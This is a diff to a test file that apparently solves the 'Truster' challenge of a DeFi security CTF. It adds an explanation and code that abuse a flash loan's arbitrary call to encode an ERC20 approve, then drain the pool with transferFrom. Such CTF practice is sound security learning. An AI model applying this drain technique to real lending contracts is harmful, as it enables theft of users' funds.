@@ -31,6 +31,23 @@ describe('[Challenge] Truster', function () {
         ).to.equal('0');
     });
 
+    /**
+     * @dev
+     * Exploit Overview:
+     * 
+     * This lending contract now allows you to execute arbritrary calls to any address
+     * when executing a flash loan. Since these calls are done on behalf of the contract
+     * we can essentially do anything as the contract (such as approve or transfer tokens!).
+     * 
+     * In this exploit I encode the ABI to approve the attacker wallet to transfer all
+     * the tokens in the pool with a 0 ether flashloan.
+     * 
+     * Then once the flashLoan is complete the attacker can transfer the approved tokens
+     * to their controlled address.
+     * 
+     * Contract exploit file is located at:
+     * "contracts/attacker-contracts/AttackTruster.sol"
+     */
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
 
@@ -43,6 +60,7 @@ describe('[Challenge] Truster', function () {
         const borrower = attacker.address;
         const target = this.token.address;
 
+        // Create the ABI to approve the attacker to spend the tokens in the pool
         const abi = ["function approve(address spender, uint256 amount)"]
         const iface = new ethers.utils.Interface(abi);
         const data = iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL])
@@ -57,13 +75,8 @@ describe('[Challenge] Truster', function () {
         console.log("Pool balance:", poolBalance.toString())
         console.log("Allowance:", allowance.toString());
 
-        // expect(
-        //     await this.token.allowance(this.pool.address, attacker.address)
-        // ).to.be.at.least('1');
-        
         await attackToken.transferFrom(this.pool.address, attacker.address, allowance);
 
-        // console.log("allowance is ", allowance.toString())
     });
 
     after(async function () {
